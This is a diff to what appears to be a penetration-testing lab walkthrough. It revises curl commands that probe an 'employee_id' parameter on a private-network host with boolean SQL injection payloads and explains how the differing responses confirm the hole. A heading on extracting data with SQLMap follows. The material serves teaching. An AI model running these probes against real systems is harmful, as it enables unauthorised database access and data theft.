@@ -148,20 +148,20 @@ The page has two potential injection points:
 Let's test the `employee_id` parameter - it's a numeric field which is often easier to exploit:
 
 ```bash
-# Normal request - shows employee details
-curl -s "http://172.16.0.100/employees/?employee_id=1" | grep -i "john\|smith"
+# Normal request - shows "Employee Details" section
+curl -s "http://172.16.0.100/employees/?employee_id=1" | grep -o "Employee Details"
 
-# Test with a simple boolean injection
-curl -s "http://172.16.0.100/employees/?employee_id=1 AND 1=1" | grep -i "john"
+# Test with a simple boolean injection (true condition - should show details)
+curl -s "http://172.16.0.100/employees/?employee_id=1 AND 1=1" | grep -o "Employee Details"
 
-# This should return nothing (false condition)
-curl -s "http://172.16.0.100/employees/?employee_id=1 AND 1=2" | grep -i "john"
+# This should return nothing (false condition - no details shown)
+curl -s "http://172.16.0.100/employees/?employee_id=1 AND 1=2" | grep -o "Employee Details"
 ```
 
 **Understanding the attack:**
-- The query becomes: `WHERE id = 1 AND 1=1` (true - returns data)
-- vs: `WHERE id = 1 AND 1=2` (false - returns nothing)
-- Different responses confirm SQL injection vulnerability
+- The query becomes: `WHERE id = 1 AND 1=1` (true - returns employee details)
+- vs: `WHERE id = 1 AND 1=2` (false - no details section appears)
+- Different responses confirm SQL injection vulnerability!
 
 ### 2.5 Extracting Data with SQLMap
 
